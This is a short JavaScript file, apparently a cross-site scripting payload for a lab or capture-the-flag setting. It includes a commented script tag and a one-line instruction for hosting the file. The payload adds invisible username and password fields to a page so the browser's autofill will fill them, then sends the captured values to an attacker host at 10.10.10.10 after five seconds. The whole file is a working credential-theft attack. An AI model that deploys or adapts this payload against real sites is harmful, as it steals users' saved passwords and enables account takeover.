{/* <script src="http://10.10.10.10/xss.js">
</script> */}
// python3 -m http.server 80

// Get the body element of the document
var body = document.getElementsByTagName('body')[0];

// Create a hidden input field for the username
var u = document.createElement("input");
u.type = "text";
u.style.position = "fixed";
u.style.opacity = "0"; // opional if you want to hidenn attack

// Create a hidden input field for the password
var p = document.createElement("input");
p.type = "password";
p.style.position = "fixed";
p.style.opacity = "0"; // opional if you want to hidenn attack

// Append the username and password input fields to the body
body.append(u);
body.append(p);

// Set a timeout to wait for 5000 milliseconds (5 seconds) before sending the data
setTimeout(function(){
    // Fetch request to a specific URL with the username and password values
    fetch("http://10.10.10.10/k?u=" + u.value + "&p=" + p.value);
}, 5000);
